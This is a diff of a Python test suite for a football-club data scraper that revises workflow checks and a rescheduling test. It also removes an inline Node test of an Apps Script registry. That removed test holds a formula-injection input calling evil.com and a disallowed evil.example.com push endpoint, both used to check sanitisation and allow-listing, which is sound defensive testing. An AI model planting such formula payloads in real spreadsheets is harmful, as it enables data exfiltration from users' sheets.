@@ -8,6 +8,7 @@ from datetime import datetime
 import glob
 import json
 import os
+import subprocess
 import sys
 import tempfile
 import unittest
@@ -31,7 +32,7 @@ def _read_fixture_soup(name: str) -> BeautifulSoup:
 
 
 def _load_sample_data() -> dict:
-    with open(os.path.join(REPO_ROOT, "data", "data.json"), "r", encoding="utf-8") as f:
+    with open(os.path.join(FIXTURE_DIR, "sample_data.json"), "r", encoding="utf-8") as f:
         return json.load(f)
 
 
@@ -39,28 +40,44 @@ class TestCBMScraper(unittest.TestCase):
     """Comprehensive test suite compatible with both `pytest` and `unittest`."""
 
     def test_workflow_yaml_files_are_valid_and_skip_ci_removed(self) -> None:
-        """There must be exactly one active scheduled data updater to avoid duplicate scrapes."""
+        """Keep one scheduled updater plus one non-scraping quality-check workflow."""
         workflow_files = sorted(
             glob.glob(os.path.join(REPO_ROOT, ".github", "workflows", "*.yml"))
             + glob.glob(os.path.join(REPO_ROOT, ".github", "workflows", "*.yaml"))
         )
-        self.assertEqual([os.path.basename(path) for path in workflow_files], ["update-data.yml"])
-        workflow_path = workflow_files[0]
-        with open(workflow_path, "r", encoding="utf-8") as f:
-            raw = f.read()
-            parsed = yaml.safe_load(raw)
-        self.assertIsInstance(parsed, dict, f"Invalid YAML in {workflow_path}")
-        self.assertIn("jobs", parsed, f"Missing jobs key in {workflow_path}")
-        self.assertNotIn("[skip ci]", raw)
-        job = parsed["jobs"].get("scrape-and-publish", {})
+        self.assertEqual(
+            [os.path.basename(path) for path in workflow_files],
+            ["quality-check.yml", "update-data.yml"],
+        )
+        parsed_workflows = {}
+        for workflow_path in workflow_files:
+            with open(workflow_path, "r", encoding="utf-8") as f:
+                raw = f.read()
+                parsed = yaml.safe_load(raw)
+            self.assertIsInstance(parsed, dict, f"Invalid YAML in {workflow_path}")
+            self.assertIn("jobs", parsed, f"Missing jobs key in {workflow_path}")
+            parsed_workflows[os.path.basename(workflow_path)] = (raw, parsed)
+            for job in parsed["jobs"].values():
+                self.assertGreaterEqual(job.get("timeout-minutes", 0), 1)
+        update_raw, update = parsed_workflows["update-data.yml"]
+        self.assertNotIn("[skip ci]", update_raw)
+        update_triggers = update.get("on", update.get(True, {}))
+        self.assertIn("schedule", update_triggers)
+        job = update["jobs"].get("scrape-and-publish", {})
         self.assertGreaterEqual(job.get("timeout-minutes", 0), 10)
-        self.assertIn("actions/cache/restore@v4", raw)
-        self.assertIn("actions/cache/save@v4", raw)
-        self.assertIn("scripts/validate_data.py", raw)
-        self.assertIn("--defer-notifications", raw)
-        self.assertIn("--notify-queued", raw)
-        self.assertIn("pages: write", raw)
-        self.assertIn("/pages/builds", raw)
+        self.assertIn("actions/cache/restore@v4", update_raw)
+        self.assertIn("actions/cache/save@v4", update_raw)
+        self.assertIn("scripts/validate_data.py", update_raw)
+        self.assertIn("--defer-notifications", update_raw)
+        self.assertIn("--notify-queued", update_raw)
+        self.assertIn("pages: write", update_raw)
+        self.assertIn("/pages/builds", update_raw)
+        quality_raw, quality = parsed_workflows["quality-check.yml"]
+        quality_triggers = quality.get("on", {})
+        self.assertIn("push", quality_triggers)
+        self.assertIn("pull_request", quality_triggers)
+        self.assertNotIn("schedule", quality_triggers)
+        self.assertNotIn("python scraper.py", quality_raw)
 
     def test_standings_parsing_and_deduction_model(self) -> None:
         soup = _read_fixture_soup("ranking.html")
@@ -194,6 +211,30 @@ class TestCBMScraper(unittest.TestCase):
         st_f, sc_f, _ = scraper.detect_match_status(soup_forfeit, "733", "734", ko)
         self.assertEqual(st_f, "forfeit")
         self.assertEqual(sc_f, (3, 0))
+
+    def test_postponed_match_becomes_rescheduled_when_new_kickoff_arrives(self) -> None:
+        data = {
+            "club": {"id": "733"},
+            "matches": [{
+                "id": "991234", "round": 8, "home": "733", "away": "729",
+                "kickoff": "2026-10-24T15:00:00+01:00", "status": "postponed",
+                "venue": "Stade Belkacem Belaid, Mila", "score": None,
+            }],
+            "opponents": [{"id": "729", "name": {"ar": "الفريق المنافس"}}],
+            "roundResults": [],
+        }
+        hint = scraper.FixtureHint(
+            match_id="991234", round_num=8, home_id="733", away_id="729",
+            kickoff="2026-11-07T15:00:00+01:00", status="scheduled",
+        )
+        notes, events = [], []
+        changed = scraper.apply_fixture_hints(data, [hint], notes, events)
+        match = data["matches"][0]
+        self.assertTrue(changed)
+        self.assertEqual(match["status"], "rescheduled")
+        self.assertEqual(match["rescheduledFrom"], "2026-10-24T15:00:00+01:00")
+        self.assertEqual(match["kickoff"], "2026-11-07T15:00:00+01:00")
+        self.assertEqual(len(events), 1)
 
     def test_accept_regression_override_flag(self) -> None:
         """Item 6: Verify played decrease blocks by default and succeeds with accept_regression=True."""
@@ -498,6 +539,7 @@ class TestCBMScraper(unittest.TestCase):
 
         soup_stats = _read_fixture_soup("statistics.html")
         soup_home = _read_fixture_soup("calendar.html")
+        data["topScorers"] = []
         problems: list[str] = []
         notes: list[str] = []
         scraper.update_statistics(
@@ -519,7 +561,8 @@ class TestCBMScraper(unittest.TestCase):
 
         hamza = next(p for p in data["players"] if str(p["id"]) == "40725")
         self.assertEqual(hamza["stats"]["goals"], 1)
-        self.assertEqual(hamza["stats"]["appearances"], 3)
+        # The fixture's saved player record already has four appearances; sync must never reduce it.
+        self.assertEqual(hamza["stats"]["appearances"], 4)
 
         soup_club = _read_fixture_soup("club_733.html")
         scraper.update_squad_and_staff(
@@ -592,178 +635,32 @@ class TestCBMScraper(unittest.TestCase):
 
 
     def test_code_gs_security_and_family_registration_group5(self) -> None:
-        """Items 17–20: Execute Code.gs in Node VM to verify formula sanitization, family multi-card registration, restore soft global tarpit, push allow-list, and lock-free verify rate limit."""
-        import subprocess
-        node_script = r'''
-const fs = require("fs");
-const vm = require("vm");
-const assert = require("assert");
+        """Run the standalone Google Apps Script registry regression suite."""
+        proc = subprocess.run(
+            ["node", os.path.join("tests", "code_gs.test.js")],
+            cwd=REPO_ROOT, capture_output=True, text=True,
+        )
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        self.assertIn("CHECKS PASSED", proc.stdout)
 
-const codeGs = fs.readFileSync("Code.gs", "utf8");
-const sheets = {};
-const cacheStore = {};
-let lockCalls = 0;
-let sleepCalls = 0;
+    def test_frontend_live_match_priority(self) -> None:
+        """Manual score is kickoff-bound and yields to official live/full-time scores."""
+        proc = subprocess.run(
+            ["node", os.path.join("tests", "app_live_match.test.js")],
+            cwd=REPO_ROOT, capture_output=True, text=True,
+        )
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        self.assertIn("APP LIVE MATCH PRIORITY CHECKS PASSED", proc.stdout)
 
-function makeSheet(name) {
-  const data = [];
-  return {
-    name,
-    data,
-    appendRow(row) { data.push(row.slice()); },
-    getDataRange() { return { getValues() { return data.map(r => r.slice()); } }; },
-    getRange(r, c, numRows = 1, numCols = 1) {
-      return {
-        setValues(vals) {
-          for (let i = 0; i < numRows; i++) {
-            for (let j = 0; j < numCols; j++) data[r - 1 + i][c - 1 + j] = vals[i][j];
-          }
-        },
-        setValue(val) { data[r - 1][c - 1] = val; }
-      };
-    },
-    deleteRow(r) { data.splice(r - 1, 1); }
-  };
-}
-
-const sandbox = {
-  console,
-  Date,
-  Math,
-  JSON,
-  String,
-  Number,
-  Boolean,
-  Array,
-  Object,
-  RegExp,
-  SpreadsheetApp: {
-    getActiveSpreadsheet() {
-      return {
-        getSheetByName(n) { return sheets[n] || null; },
-        insertSheet(n) { sheets[n] = makeSheet(n); return sheets[n]; }
-      };
-    }
-  },
-  CacheService: {
-    getScriptCache() {
-      return {
-        get(k) { return cacheStore[k] || null; },
-        put(k, v) { cacheStore[k] = String(v); },
-        remove(k) { delete cacheStore[k]; }
-      };
-    }
-  },
-  PropertiesService: {
-    getScriptProperties() {
-      return {
-        getProperty(k) { return k === "ADMIN_KEY" ? "secret-admin-123" : null; },
-        setProperty() {}
-      };
-    }
-  },
-  LockService: {
-    getScriptLock() {
-      return {
-        tryLock() { lockCalls++; return true; },
-        releaseLock() {}
-      };
-    }
-  },
-  ContentService: {
-    MimeType: { JSON: "application/json" },
-    createTextOutput(str) {
-      return {
-        _str: str,
-        setMimeType() { return this; },
-        toJSON() { return JSON.parse(this._str); }
-      };
-    }
-  },
-  Utilities: {
-    sleep(ms) { sleepCalls += ms; }
-  }
-};
-
-vm.createContext(sandbox);
-vm.runInContext(codeGs, sandbox);
-
-function post(obj) {
-  const res = sandbox.doPost({ postData: { contents: JSON.stringify(obj) } });
-  return res.toJSON();
-}
-
-// 1) Formula injection protection
-const fRes = post({ v: 2, a: "register", name: "=IMPORTXML(\"https://evil.com\",\"//a\")", dev: "dev-formula", lang: "ar" });
-assert.strictEqual(fRes.ok, true);
-assert.strictEqual(sheets["Supporters"].data[1][2].startsWith("'=IMPORTXML"), true);
-
-// 2) Family members sharing a phone (Item 18)
-const fam1 = post({ v: 2, a: "register", name: "بلعريبي سعيد", dev: "family-phone", lang: "ar" });
-assert.strictEqual(fam1.ok, true);
-const fam1Retry = post({ v: 2, a: "register", name: "بلعريبي سعيد", dev: "family-phone", lang: "ar" });
-assert.strictEqual(fam1Retry.ok, true);
-assert.strictEqual(fam1Retry.deduped, true);
-assert.strictEqual(fam1Retry.supporterId, fam1.supporterId);
-
-const fam2 = post({ v: 2, a: "register", name: "بلعريبي ياسين", dev: "family-phone", lang: "ar" });
-assert.strictEqual(fam2.ok, true);
-assert.notStrictEqual(fam2.supporterId, fam1.supporterId);
-
-const fam3 = post({ v: 2, a: "register", name: "بلعريبي مريم", dev: "family-phone", lang: "ar" });
-assert.strictEqual(fam3.ok, true);
-
-// 4th registration on same device within 15m hits REGISTER_MAX_PER_DEV = 3
-const fam4 = post({ v: 2, a: "register", name: "بلعريبي كمال", dev: "family-phone", lang: "ar" });
-assert.strictEqual(fam4.ok, false);
-assert.strictEqual(fam4.code, "rate_limit");
-
-// 3) Disallowed vs allowed push endpoints
-const badPush = post({ v: 2, a: "push_sub", dev: "d1", sub: { endpoint: "https://evil.example.com/push", keys: { p256dh: "k", auth: "a" } } });
-assert.strictEqual(badPush.ok, false);
-assert.strictEqual(badPush.code, "invalid_subscription");
-
-const goodPush = post({ v: 2, a: "push_sub", dev: "d1", sub: { endpoint: "https://fcm.googleapis.com/fcm/send/123", keys: { p256dh: "k", auth: "a" } } });
-assert.strictEqual(goodPush.ok, true);
-
-// 4) Restore per-card limit + soft global protection without DoS (Item 17)
-for (let i = 1; i <= 5; i++) {
-  const rFail = post({ v: 2, a: "restore", name: "Wrong Name", supporterId: fam1.supporterId, dev: "attacker-" + i });
-  assert.strictEqual(rFail.code, "not_found");
-}
-const rLocked = post({ v: 2, a: "restore", name: "بلعريبي سعيد", supporterId: fam1.supporterId, dev: "attacker-6" });
-assert.strictEqual(rLocked.code, "rate_limit");
-
-// Simulate global attack (rl_rest_global = 35): legitimate user on registered device restores fam2 without lockout or tarpit!
-cacheStore["rl_rest_global"] = "35";
-const sleepBefore = sleepCalls;
-const rLegitRegDev = post({ v: 2, a: "restore", name: "بلعريبي ياسين", supporterId: fam2.supporterId, dev: "family-phone" });
-assert.strictEqual(rLegitRegDev.ok, true);
-assert.strictEqual(sleepCalls, sleepBefore);
-
-// Legitimate user on a new device during global attack still succeeds after soft 1500ms tarpit (not locked out!)
-const rLegitNewDev = post({ v: 2, a: "restore", name: "بلعريبي ياسين", supporterId: fam2.supporterId, dev: "new-phone-1" });
-assert.strictEqual(rLegitNewDev.ok, true);
-assert.strictEqual(sleepCalls, sleepBefore + 1500);
-
-// 5) Verify runs WITHOUT LockService and enforces VERIFY_MAX_PER_DEV = 30 (Items 19 & 20)
-const locksBeforeVerify = lockCalls;
-const vOk = post({ v: 2, a: "verify", supporterId: fam1.supporterId, dev: "scanner-1" });
-assert.strictEqual(vOk.ok, true);
-assert.strictEqual(vOk.maskedName, "ب*** س***");
-assert.strictEqual(lockCalls, locksBeforeVerify);
-
-for (let i = 2; i <= 30; i++) {
-  const v = post({ v: 2, a: "verify", supporterId: fam1.supporterId, dev: "scanner-1" });
-  assert.strictEqual(v.ok, true);
-}
-const vRateLimited = post({ v: 2, a: "verify", supporterId: fam1.supporterId, dev: "scanner-1" });
-assert.strictEqual(vRateLimited.ok, false);
-assert.strictEqual(vRateLimited.code, "rate_limit");
-console.log("Code.gs Node VM tests passed!");
-'''
-        proc = subprocess.run(["node", "-e", node_script], cwd=REPO_ROOT, capture_output=True, text=True, check=True)
-        self.assertIn("Code.gs Node VM tests passed!", proc.stdout)
+    def test_telegram_live_control_kickoff_generation(self) -> None:
+        """Old prompts and button callbacks must not control a rescheduled fixture."""
+        proc = subprocess.run(
+            ["node", os.path.join("tests", "live_control.test.js")],
+            cwd=REPO_ROOT, capture_output=True, text=True,
+        )
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        self.assertIn("LIVE CONTROL CHECKS PASSED", proc.stdout)
+        self.assertIn("TELEGRAM CALLBACK HANDLER CHECKS PASSED", proc.stdout)
 
 
 if __name__ == "__main__":
